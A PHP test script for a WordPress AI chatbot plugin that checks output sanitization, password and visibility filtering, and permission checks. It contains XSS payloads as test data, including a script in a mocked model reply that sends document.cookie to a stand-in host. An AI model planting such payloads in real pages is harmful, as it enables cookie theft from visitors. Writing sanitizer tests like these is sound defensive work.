<?php
/**
 * IA Tools · lo que el servidor entrega del modelo: la ruta pública del chatbot devuelve texto plano (sin etiquetas ni
 * caracteres de control, con sus saltos de línea) y un error genérico; el contexto y la base de conocimiento nunca usan
 * contenido con contraseña ni de un tipo no público; la importación de imágenes sólo toca contenidos editables; el
 * borrador generado sólo lleva los campos pedidos, saneados; los clusters MCP sólo muestran lo que el usuario puede leer;
 * y el chat de un artículo con contraseña no se pinta antes de escribirla. Sin WordPress: funciones mínimas con el mismo
 * contrato.
 */
define( 'ABSPATH', __DIR__ . '/' );
define( 'MINUTE_IN_SECONDS', 60 );
define( 'HOUR_IN_SECONDS', 3600 );
define( 'DAY_IN_SECONDS', 86400 );
$GLOBALS['options'] = array();
$GLOBALS['transients'] = array();
$GLOBALS['posts'] = array();
$GLOBALS['meta'] = array();
$GLOBALS['remote'] = null;
$GLOBALS['remote_calls'] = 0;
$GLOBALS['get_posts_args'] = array();
$GLOBALS['editable'] = array();
$GLOBALS['after_permission'] = 0;
$checks = 0;
function check( $condition, $message ) { global $checks; if ( ! $condition ) { echo "FALLA: $message\n"; exit( 1 ); } $checks++; }

class WP_Error {
	public $code; public $message; public $data;
	public function __construct( $code = '', $message = '', $data = '' ) { $this->code = $code; $this->message = $message; $this->data = $data; }
	public function get_error_message() { return $this->message; }
	public function get_error_code() { return $this->code; }
	public function get_error_data() { return $this->data; }
}
final class WP_Post {
	public $ID = 0; public $post_title = ''; public $post_content = ''; public $post_password = ''; public $post_status = 'publish'; public $post_type = 'post';
	public function __construct( array $data ) { foreach ( $data as $key => $value ) $this->$key = $value; }
}
class WP_REST_Request implements ArrayAccess {
	private $params; private $files;
	public function __construct( array $params = array(), array $files = array() ) { $this->params = $params; $this->files = $files; }
	public function get_param( $key ) { return $this->params[ $key ] ?? null; }
	public function has_param( $key ) { return array_key_exists( $key, $this->params ); }
	public function get_file_params() { return $this->files; }
	#[\ReturnTypeWillChange]
	public function offsetExists( $key ) { return isset( $this->params[ $key ] ); }
	#[\ReturnTypeWillChange]
	public function offsetGet( $key ) { return $this->params[ $key ] ?? null; }
	#[\ReturnTypeWillChange]
	public function offsetSet( $key, $value ) { $this->params[ $key ] = $value; }
	#[\ReturnTypeWillChange]
	public function offsetUnset( $key ) { unset( $this->params[ $key ] ); }
}
function is_wp_error( $value ) { return $value instanceof WP_Error; }
function is_multisite() { return false; }
function get_option( $name, $default = false ) { return $GLOBALS['options'][ $name ] ?? $default; }
function update_option( $name, $value, $autoload = null ) { $GLOBALS['options'][ $name ] = $value; return true; }
function get_site_option( $name, $default = false ) { return $default; }
function wp_parse_args( $args, $defaults = array() ) { return array_merge( $defaults, (array) $args ); }
function get_transient( $key ) { return $GLOBALS['transients'][ $key ] ?? false; }
function set_transient( $key, $value, $ttl = 0 ) { $GLOBALS['transients'][ $key ] = $value; return true; }
function apply_filters( $name, $value ) { return $value; }
function current_time( $type ) { return gmdate( 'Y-m-d H:i:s' ); }
function sanitize_key( $key ) { return preg_replace( '/[^a-z0-9_\-]/', '', strtolower( (string) $key ) ); }
function absint( $value ) { return abs( (int) $value ); }
function wp_json_encode( $data, $flags = 0 ) { return json_encode( $data, $flags ); }
function rest_ensure_response( $data ) { return $data; }
function remove_accents( $text ) { return $text; }
function strip_shortcodes( $text ) { return $text; }
function wp_is_post_revision( $id ) { return false; }
function post_type_supports( $type, $feature ) { return true; }
// Tipos públicos como en WordPress: post y page lo son; un tipo de $GLOBALS['private_types'] no.
function get_post_type_object( $type ) { return (object) array( 'name' => $type, 'public' => ! in_array( $type, $GLOBALS['private_types'] ?? array(), true ) ); }
function get_permalink( $post ) { return 'https://sitio.test/?p=' . ( is_object( $post ) ? $post->ID : (int) $post ); }
function get_post_modified_time( $format = 'U', $gmt = false, $post = null ) { return '2026-11-05T00:00:00+00:00'; }
function update_post_meta( $id, $key, $value ) { $GLOBALS['meta'][ $id ][ $key ] = $value; return true; }
function get_post_meta( $id, $key, $single = false ) { return $GLOBALS['meta'][ $id ][ $key ] ?? ''; }
function get_post( $id ) { return $GLOBALS['posts'][ (int) $id ] ?? null; }
function get_the_title( $id ) { return get_post( $id )->post_title ?? ''; }
function current_user_can( $cap, $id = 0 ) { return ( 'edit_post' === $cap && in_array( (int) $id, $GLOBALS['editable'], true ) ) || ( 'read_post' === $cap && in_array( (int) $id, $GLOBALS['readable'] ?? array(), true ) ); }
function get_current_user_id() { return 5; }
function esc_url_raw( $url ) { $GLOBALS['after_permission']++; return (string) $url; }
function wp_strip_all_tags( $text, $remove_breaks = false ) {
	if ( is_null( $text ) || ! is_scalar( $text ) ) return '';
	$text = preg_replace( '@<(script|style)[^>]*?>.*?</\\1>@si', '', (string) $text );
	$text = strip_tags( $text );
	if ( $remove_breaks ) $text = preg_replace( '/[\r\n\t ]+/', ' ', $text );
	return trim( $text );
}
function sanitize_text_field( $text ) { return is_scalar( $text ) ? trim( preg_replace( '/[\r\n\t ]+/', ' ', wp_strip_all_tags( (string) $text ) ) ) : ''; }
function sanitize_textarea_field( $text ) { return is_scalar( $text ) ? trim( wp_strip_all_tags( (string) $text ) ) : ''; }
// Mismo efecto que wp_kses_post sobre lo que se prueba: fuera script y atributos on*, se conserva el HTML editorial.
function wp_kses_post( $html ) { $GLOBALS['kses_calls'] = ( $GLOBALS['kses_calls'] ?? 0 ) + 1; return preg_replace( array( '@<script[^>]*>.*?</script>@si', '/\s+on[a-z]+\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)/i' ), '', (string) $html ); }
function wp_trim_words( $text, $num = 55, $more = null ) { return implode( ' ', array_slice( preg_split( '/\s+/', trim( (string) $text ) ), 0, $num ) ); }
function get_posts( $args ) {
	$GLOBALS['get_posts_args'][] = $args;
	if ( isset( $GLOBALS['get_posts_result'] ) ) return ( $GLOBALS['get_posts_result'] )( $args );
	return array_values( array_filter( $GLOBALS['posts'], function( $post ) use ( $args ) {
		return 'publish' === $post->post_status && ! ( array_key_exists( 'has_password', $args ) && false === $args['has_password'] && '' !== $post->post_password );
	} ) );
}
function wp_remote_post( $url, $args ) { $GLOBALS['remote_calls']++; return $GLOBALS['remote']; }
function wp_remote_retrieve_response_code( $response ) { return $response['response']['code'] ?? 0; }
function wp_remote_retrieve_body( $response ) { return $response['body'] ?? ''; }
function wp_list_ids( $records ) { return array_values( array_map( function( $record ) { return $record['id']; }, $records ) ); }
function openai( $text, $code = 200 ) { return array( 'response' => array( 'code' => $code ), 'body' => json_encode( array( 'choices' => array( array( 'message' => array( 'content' => $text ) ) ) ) ) ); }

require __DIR__ . '/../digitalisimo-ia-tools/includes/class-digitalisimo-ai.php';
require __DIR__ . '/../digitalisimo-ia-tools/includes/class-digitalisimo-ai-knowledge.php';
require __DIR__ . '/../digitalisimo-ia-tools/includes/class-digitalisimo-ai-content-playbook.php';
require __DIR__ . '/../digitalisimo-ia-tools/includes/class-content-automation.php';
require __DIR__ . '/../digitalisimo-ia-tools/includes/class-digitalisimo-mcp-articles.php';
require __DIR__ . '/../digitalisimo-ia-tools/includes/class-digitalisimo-ai-article-chat.php';

$GLOBALS['options']['digitalisimo_ai_options'] = array(
	'chat_enabled' => 1, 'knowledge_enabled' => 1, 'mcp_featured_image_enabled' => 1,
	'providers' => array( 'openai' => array( 'enabled' => true, 'key' => 'sk-prueba-secreta', 'url' => '' ) ),
);
$post = function( $id, $title, $content, $password = '', $status = 'publish' ) { return new WP_Post( array( 'ID' => $id, 'post_title' => $title, 'post_content' => $content, 'post_password' => $password, 'post_status' => $status, 'post_type' => 'post' ) ); };
$GLOBALS['posts'] = array(
	1 => $post( 1, 'Servicios públicos', 'Ofrecemos diseño web y tiendas en línea.' ),
	2 => $post( 2, 'Tarifas internas', 'Precio secreto para socios: 999 dólares.', 'clave-socios' ),
);

// 1. plain_text: texto, sin etiquetas (ni el contenido de script/style) ni caracteres de control, con sus saltos de línea.
$plain = Digitalisimo_AI::plain_text( "Hola <b>mundo</b>\r\n<img src=x onerror=alert(document.cookie)>Línea 2\x07\x00\n<script>alert(1)</script><style>p{}</style>Fin <a href=\"javascript:alert(1)\" onclick=\"x()\">enlace</a>" );
check( "Hola mundo\nLínea 2\nFin enlace" === $plain, 'plain_text debe dejar sólo texto y saltos de línea: ' . json_encode( $plain ) );
check( "a < b y c > d\n\n\tlista" === Digitalisimo_AI::plain_text( "  a < b y c > d\n\n\tlista  " ), 'plain_text conserva comparaciones sueltas, líneas en blanco y tabuladores.' );
check( '&lt;img src=x onerror=alert(1)&gt;' === Digitalisimo_AI::plain_text( '&lt;img src=x onerror=alert(1)&gt;' ), 'plain_text no decodifica entidades: lo ya escapado sigue siendo texto.' );

// 2. La ruta pública /chat devuelve texto plano, declara el formato y no usa contenido con contraseña como contexto.
$GLOBALS['remote'] = openai( "<img src=x onerror=alert(1)>Hacemos sitios web.\n<script>fetch('//x.test/'+document.cookie)</script>Escríbenos." );
$_SERVER['REMOTE_ADDR'] = '203.0.113.7';
$response = Digitalisimo_AI::chat( new WP_REST_Request( array( 'message' => '¿Qué hacen?' ) ) );
check( is_array( $response ) && "Hacemos sitios web.\nEscríbenos." === $response['answer'], 'La respuesta del chatbot llega como texto plano: ' . json_encode( $response ) );
check( 'text' === ( $response['format'] ?? '' ), 'La respuesta declara format = text.' );
$args = end( $GLOBALS['get_posts_args'] );
check( array_key_exists( 'has_password', $args ) && false === $args['has_password'], 'El contexto del chatbot excluye las entradas con contraseña.' );
check( false === strpos( wp_json_encode( $response ), 'secret' ) && false === strpos( wp_json_encode( $response ), 'sk-' ), 'La respuesta no expone la clave.' );

// 3. Un fallo del proveedor llega al visitante como aviso genérico (sin HTTP, cURL ni detalle interno) y con estado 502.
$GLOBALS['remote'] = openai( '', 401 );
$error = Digitalisimo_AI::chat( new WP_REST_Request( array( 'message' => 'Hola' ) ) );
check( is_wp_error( $error ) && 502 === ( $error->data['status'] ?? 0 ), 'Un fallo del proveedor devuelve 502.' );
check( false === strpos( $error->message, 'HTTP' ) && false === strpos( $error->message, '401' ), 'El aviso público no lleva el detalle del proveedor: ' . $error->message );
$GLOBALS['remote'] = openai( '<script>alert(1)</script>' );
$empty = Digitalisimo_AI::chat( new WP_REST_Request( array( 'message' => 'Hola' ) ) );
check( is_wp_error( $empty ) && 502 === ( $empty->data['status'] ?? 0 ), 'Una respuesta que sólo trae etiquetas no se entrega vacía.' );
$GLOBALS['options']['digitalisimo_ai_options']['chat_enabled'] = 0;
$off = Digitalisimo_AI::chat( new WP_REST_Request( array( 'message' => 'Hola' ) ) );
check( is_wp_error( $off ) && 403 === ( $off->data['status'] ?? 0 ), 'Con el chatbot desactivado sigue devolviendo 403.' );
$GLOBALS['options']['digitalisimo_ai_options']['chat_enabled'] = 1;

// 4. Base de conocimiento: lo protegido sale del índice al guardarse y no se recupera aunque un índice anterior lo tenga.
$GLOBALS['options']['digitalisimo_ai_knowledge'] = array(
	1 => array( 'id' => 1, 'title' => 'Servicios públicos', 'url' => 'https://sitio.test/servicios/', 'content' => 'diseño web tiendas precio', 'tokens' => array( 'servicios', 'precio', 'tiendas' ) ),
	2 => array( 'id' => 2, 'title' => 'Tarifas internas', 'url' => 'https://sitio.test/tarifas/', 'content' => 'Precio secreto para socios: 999 dólares.', 'tokens' => array( 'precio', 'secreto', 'socios' ) ),
	3 => array( 'id' => 3, 'title' => 'Borrado', 'url' => 'https://sitio.test/borrado/', 'content' => 'precio viejo', 'tokens' => array( 'precio' ) ),
);
$found = wp_list_ids( Digitalisimo_AI_Knowledge::search( 'precio secreto socios', 4 ) );
check( array( 1 ) === $found, 'La búsqueda sólo devuelve contenido público vigente: ' . json_encode( $found ) );
$context = Digitalisimo_AI_Knowledge::append_context( '', 'chatbot', new WP_REST_Request( array( 'message' => 'precio secreto socios' ) ) );
check( false === strpos( $context, '999' ) && false !== strpos( $context, 'Servicios públicos' ), 'El contexto del chatbot no contiene el texto protegido.' );
Digitalisimo_AI_Knowledge::index_post( 2, $GLOBALS['posts'][2], true );
check( ! isset( $GLOBALS['options']['digitalisimo_ai_knowledge'][2] ), 'Guardar un contenido con contraseña lo quita del índice.' );
$GLOBALS['posts'][4] = $post( 4, 'Privada', 'Notas privadas', '', 'private' );
$GLOBALS['options']['digitalisimo_ai_knowledge'][4] = array( 'id' => 4, 'title' => 'Privada', 'url' => 'https://sitio.test/privada/', 'content' => 'Notas privadas', 'tokens' => array( 'notas', 'privadas' ) );
check( array() === wp_list_ids( Digitalisimo_AI_Knowledge::search( 'notas privadas', 4 ) ), 'Lo que pasó a privado tampoco se recupera.' );

// 5. import-image: sólo adjunta a un contenido que el usuario puede editar (antes de descargar nada).
$GLOBALS['editable'] = array( 8 );
$GLOBALS['posts'][7] = $post( 7, 'De otra persona', 'x' );
$GLOBALS['posts'][8] = $post( 8, 'Mía', 'x' );
$denied = Digitalisimo_Content_Automation::import_image( new WP_REST_Request( array( 'post_id' => 7, 'url' => 'https://img.test/a.png' ) ) );
check( is_wp_error( $denied ) && 403 === ( $denied->data['status'] ?? 0 ) && 0 === $GLOBALS['after_permission'], 'No se puede poner una imagen destacada en un contenido ajeno.' );
$mine = Digitalisimo_Content_Automation::import_image( new WP_REST_Request( array( 'post_id' => 8 ) ) );
check( is_wp_error( $mine ) && 'no_image' === $mine->code && 1 === $GLOBALS['after_permission'], 'En un contenido propio sigue al paso siguiente.' );

// 6. Borrador generado: sólo los campos pedidos, texto plano en los de texto y HTML permitido en el cuerpo.
$GLOBALS['remote'] = openai( "```json\n" . json_encode( array(
	'title' => 'Diseño web <img src=x onerror=alert(1)>para pymes',
	'seo_title' => '<script>alert(1)</script>Diseño web',
	'meta_description' => 'Guía <b>práctica</b> para elegir proveedor de diseño web en tu ciudad, con costos y pasos claros.',
	'secondary_keywords' => array( 'tienda <i>en línea</i>', array( 'no' ), '' ),
	'content' => '<h1>Duplicado</h1><p onclick="robar()">Texto <strong>útil</strong>.</p><script>alert(1)</script>',
	'extra' => '<iframe src="javascript:alert(1)"></iframe>',
) ) . "\n```" );
$draft = Digitalisimo_AI_Content_Playbook::generate( 'diseño web', array( 'tiendas' ), '' );
check( is_array( $draft ) && array( 'title', 'seo_title', 'meta_description', 'secondary_keywords', 'content' ) === array_keys( $draft ), 'El borrador sólo lleva los campos pedidos: ' . json_encode( is_array( $draft ) ? array_keys( $draft ) : $draft ) );
check( 'Diseño web para pymes' === $draft['title'] && 'Diseño web' === $draft['seo_title'] && false === strpos( $draft['meta_description'], '<' ), 'Título, título SEO y descripción son texto plano.' );
check( array( 'tienda en línea' ) === $draft['secondary_keywords'], 'Las keywords secundarias son texto y se descartan las vacías o no escalares.' );
check( '<p>Texto <strong>útil</strong>.</p>' === $draft['content'] && ! empty( $GLOBALS['kses_calls'] ), 'El cuerpo pasa por wp_kses_post y pierde el H1 duplicado: ' . $draft['content'] );
$GLOBALS['remote'] = openai( json_encode( array( 'title' => '<b></b>', 'meta_description' => 'x', 'content' => '<p>x</p>' ) ) );
check( is_wp_error( Digitalisimo_AI_Content_Playbook::generate( 'x' ) ), 'Un título que sólo trae etiquetas no da un borrador válido.' );
$GLOBALS['remote'] = openai( json_encode( array( 'title' => 'T', 'meta_description' => 'D', 'content' => array( '<p>x</p>' ) ) ) );
check( is_wp_error( Digitalisimo_AI_Content_Playbook::generate( 'x' ) ), 'Un cuerpo que no es texto no da un borrador válido.' );
$GLOBALS['remote'] = openai( json_encode( array( 'title' => 'T', 'meta_description' => 'D', 'secondary_keywords' => 'uno, dos', 'content' => '<p>x</p>' ) ) );
check( array( 'uno', 'dos' ) === Digitalisimo_AI_Content_Playbook::generate( 'x' )['secondary_keywords'], 'Unas keywords en una sola cadena se separan por comas.' );

// 7. Un tipo de contenido no público (notas internas, bloques, plantillas) no entra en el índice al guardarse ni se
// recupera de un índice anterior: index_post() aplica el mismo criterio que rebuild(), que sólo recorre tipos públicos.
$GLOBALS['private_types'] = array( 'nota_interna' );
$GLOBALS['posts'][9] = new WP_Post( array( 'ID' => 9, 'post_title' => 'Nota interna', 'post_content' => 'Margen interno del 40 %.', 'post_type' => 'nota_interna' ) );
$GLOBALS['options']['digitalisimo_ai_knowledge'][9] = array( 'id' => 9, 'title' => 'Nota interna', 'url' => '', 'content' => 'Margen interno del 40 %.', 'tokens' => array( 'margen', 'interno' ) );
check( array() === wp_list_ids( Digitalisimo_AI_Knowledge::search( 'margen interno', 4 ) ), 'Un índice anterior no entrega contenido de un tipo no público.' );
Digitalisimo_AI_Knowledge::index_post( 9, $GLOBALS['posts'][9], true );
check( ! isset( $GLOBALS['options']['digitalisimo_ai_knowledge'][9] ), 'Guardar contenido de un tipo no público lo quita del índice.' );

// 8. Clusters MCP (edit_posts): sólo pilares e hijas que el usuario puede leer; con permiso de lectura, todo como antes.
$GLOBALS['posts'][20] = $post( 20, 'Pilar público', 'x' );
$GLOBALS['posts'][21] = $post( 21, 'Pilar privado ajeno', 'x', '', 'private' );
$GLOBALS['posts'][22] = $post( 22, 'Hija publicada', 'x' );
$GLOBALS['posts'][23] = $post( 23, 'Hija en borrador ajeno', 'x', '', 'draft' );
$GLOBALS['get_posts_result'] = function( $args ) {
	if ( 'digitalisimo_seo_pillar' === ( $args['meta_key'] ?? '' ) ) return array( get_post( 20 ), get_post( 21 ) );
	return '_related_pillar' === ( $args['meta_key'] ?? '' ) && 20 === (int) $args['meta_value'] ? array( 22, 23 ) : array();
};
$GLOBALS['readable'] = array( 20, 22 );
$clusters = Digitalisimo_MCP_Articles::clusters();
check( array( 20 ) === array_column( $clusters['pillars'], 'id' ) && false === strpos( wp_json_encode( $clusters ), 'privado' ), 'Un pilar privado ajeno no aparece: ' . wp_json_encode( $clusters ) );
check( array( 22 ) === array_column( $clusters['pillars'][0]['children'], 'id' ) && false === strpos( wp_json_encode( $clusters ), 'borrador' ), 'Una hija en borrador ajeno no aparece.' );
$GLOBALS['readable'] = array( 20, 21, 22, 23 );
$clusters = Digitalisimo_MCP_Articles::clusters();
check( array( 20, 21 ) === array_column( $clusters['pillars'], 'id' ) && array( 22, 23 ) === array_column( $clusters['pillars'][0]['children'], 'id' ), 'Quien puede leerlo todo sigue viendo todos los pilares y sus hijas.' );
unset( $GLOBALS['get_posts_result'] );

// 9. [digitalisimo_article_chat] en una plantilla: el chat de un artículo con contraseña no se pinta hasta escribirla.
function get_queried_object_id() { return $GLOBALS['queried'] ?? 0; }
function get_the_ID() { return 0; }
function get_post_type( $id ) { return get_post( $id )->post_type ?? false; }
function get_post_types( $args = array(), $output = 'names' ) { return array( 'post' => 'post', 'page' => 'page' ); }
function post_password_required( $id = null ) { $item = get_post( $id ); return $item && '' !== $item->post_password && empty( $GLOBALS['password_entered'] ); }
function esc_html( $text ) { return htmlspecialchars( (string) $text, ENT_QUOTES, 'UTF-8' ); }
function esc_attr( $text ) { return htmlspecialchars( (string) $text, ENT_QUOTES, 'UTF-8' ); }
function wp_get_attachment_image() { return ''; }
$dialogue = wp_json_encode( array( 'speakers' => array( array( 'id' => 'ana', 'name' => 'Ana', 'icon' => '💬', 'align' => 'start' ) ), 'messages' => array( array( 'speaker' => 'ana', 'text' => 'Dato sólo para quien tiene la clave' ) ) ) );
$GLOBALS['posts'][30] = $post( 30, 'Protegida', 'x', 'clave' ); $GLOBALS['meta'][30]['digitalisimo_article_chat'] = $dialogue;
$GLOBALS['posts'][31] = $post( 31, 'Abierta', 'x' ); $GLOBALS['meta'][31]['digitalisimo_article_chat'] = $dialogue;
unset( $post ); // current_content_id() lee el global $post de WordPress.
$GLOBALS['queried'] = 30;
check( '' === Digitalisimo_AI_Article_Chat::shortcode(), 'El chat de un artículo con contraseña no se pinta sin ella.' );
$GLOBALS['password_entered'] = true;
check( false !== strpos( Digitalisimo_AI_Article_Chat::shortcode(), 'Dato sólo para quien tiene la clave' ), 'Con la contraseña escrita el chat se pinta.' );
unset( $GLOBALS['password_entered'] );
$GLOBALS['queried'] = 31;
check( false !== strpos( Digitalisimo_AI_Article_Chat::shortcode(), '<strong>Ana</strong>' ), 'Un artículo sin contraseña pinta su chat como antes.' );

echo "IA Tools · servidor del chatbot: $checks comprobaciones (texto plano, error genérico, sin contenido con contraseña ni de tipos no públicos, imágenes sólo en contenido editable, borrador saneado, clusters legibles y chat de artículo protegido).\n";
